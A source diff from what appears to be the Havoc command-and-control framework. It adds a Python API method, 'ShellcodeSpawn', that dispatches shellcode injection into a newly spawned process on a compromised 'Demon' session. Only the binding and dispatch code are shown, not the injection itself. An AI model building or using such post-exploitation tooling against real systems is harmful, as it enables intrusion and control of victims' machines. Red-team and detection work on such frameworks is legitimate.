@@ -40,6 +40,7 @@ PyMethodDef PyDemonClass_methods[] = {
         { "DllSpawn",               ( PyCFunction ) DemonClass_DllSpawn,               METH_VARARGS, "Spawn and injects a reflective dll and get output from it" },
         { "DllInject",              ( PyCFunction ) DemonClass_DllInject,              METH_VARARGS, "Injects a reflective dll into a specified process" },
         { "DotnetInlineExecute",    ( PyCFunction ) DemonClass_DotnetInlineExecute,    METH_VARARGS, "Executes a dotnet assembly in the context of the demon sessions" },
+        { "ShellcodeSpawn",         ( PyCFunction ) DemonClass_ShellcodeSpawn,         METH_VARARGS, "Executes shellcode spawning a new process" },
 
         { NULL },
 };
@@ -375,6 +376,48 @@ PyObject* DemonClass_DllSpawn( PPyDemonClass self, PyObject *args )
             else
             {
                 Sessions.InteractedWidget->DemonCommands->Execute.DllSpawn( TaskID, DllPath, ArgsByteArray );
+            }
+
+            break;
+        }
+    }
+
+    Py_RETURN_NONE;
+}
+
+
+// ShellcodeSpawn( QString TaskID, QString InjectionTechnique, QString TargetArch, QString Path, QString Arguments )
+PyObject* DemonClass_ShellcodeSpawn( PPyDemonClass self, PyObject *args )
+{
+    char* TaskID          = NULL;
+    char* InjectTechnique = NULL;
+    char* TargetArch      = NULL;
+    char* ShellcodePath   = NULL;
+    char* ShellcodeArgs   = NULL;
+    int   ArgSize         = 0;
+    auto  ArgsByteArray   = QByteArray();
+
+    spdlog::debug( "Running ShellcodeSpawn from python API" );
+
+    if ( ! PyArg_ParseTuple( args, "ssssO", &TaskID, &InjectTechnique, &TargetArch, &ShellcodePath, &ShellcodeArgs ) )
+        return NULL;
+
+    ArgSize       = PyBytes_GET_SIZE( ShellcodeArgs );
+    ShellcodeArgs = PyBytes_AS_STRING( ShellcodeArgs );
+    ArgsByteArray = QByteArray( ShellcodeArgs, ArgSize );
+
+    for ( auto& Sessions : HavocX::Teamserver.Sessions )
+    {
+        if ( Sessions.Name.compare( self->DemonID ) == 0 )
+        {
+            if ( FileRead( ShellcodePath ) == nullptr )
+            {
+                Sessions.InteractedWidget->AppendRaw();
+                Sessions.InteractedWidget->TaskError( "Failed to open shellcode path: " + QString( ShellcodePath ) );
+            }
+            else
+            {
+                Sessions.InteractedWidget->DemonCommands->Execute.ShellcodeSpawn( TaskID, InjectTechnique, TargetArch, ShellcodePath, ArgsByteArray );
             }
 
             break;
